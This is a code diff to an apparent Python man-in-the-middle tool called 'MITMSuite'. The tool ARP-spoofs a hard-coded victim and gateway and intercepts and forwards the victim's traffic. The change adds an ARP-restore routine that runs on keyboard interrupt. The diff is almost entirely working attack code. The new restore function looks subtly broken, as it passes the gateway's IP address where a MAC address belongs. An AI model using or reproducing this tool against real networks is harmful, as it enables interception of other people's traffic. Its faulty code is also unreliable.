@@ -37,6 +37,12 @@ def enable_forwarding(target_mac, gateway_mac, target_ip, my_mac):
         prn=lambda pkt: forward_packet(pkt, target_mac, gateway_mac, target_ip, my_mac),
         store=0)
 
+def restore_arp(target_mac, gateway_mac, target_ip, gateway_ip):
+    packet_to_victim = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_ip)
+    packet_to_gateway = Ether(dst=gateway_mac) / ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac)
+    sendp(packet_to_victim, verbose=False)
+    sendp(packet_to_gateway, verbose=False)
+
 def main():
     gateway_ip = "192.168.10.1"
     gateway_mac = get_mac(gateway_ip)
@@ -45,12 +51,15 @@ def main():
     my_mac = get_if_hwaddr(conf.iface)
     my_ip = get_if_addr(conf.iface)
     print("Welcome to MITMSuite")
-    forwading_thread = threading.Thread(target=enable_forwarding, args=(victim_mac, gateway_mac, victim_ip, my_mac))
-    forwading_thread.deamon = True
-    forwading_thread.start()
-    spoof(victim_ip, gateway_ip, victim_mac, gateway_mac, my_mac)
-    while True:
-        command = input(">> ")
+    try:
+        forwading_thread = threading.Thread(target=enable_forwarding, args=(victim_mac, gateway_mac, victim_ip, my_mac))
+        forwading_thread.deamon = True
+        forwading_thread.start()
+        spoof(victim_ip, gateway_ip, victim_mac, gateway_mac, my_mac)
+        while True:
+            command = input(">> ")
+    except KeyboardInterrupt:
+        restore_arp(victim_mac, gateway_mac, victim_ip, gateway_ip)
 
 if __name__ == "__main__":
     main()
